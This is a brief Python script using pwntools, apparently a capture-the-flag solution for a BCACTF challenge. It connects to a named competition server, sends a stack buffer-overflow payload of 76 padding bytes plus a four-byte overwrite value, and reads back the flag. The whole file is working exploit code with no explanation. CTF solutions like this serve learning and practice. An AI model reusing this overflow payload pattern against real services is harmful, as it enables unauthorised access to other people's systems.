#!/usr/bin/python
from pwn import *
host = "bin.bcactf.com"
port = 49154
payload = "A"*76 + "\x41\x42\x43\x73"
s = remote(host, port)
s.recvuntil("Answer for 1:")
s.sendline(payload)
print(s.recvuntil("bcactf{")[-7:] + s.recvuntil("}"))

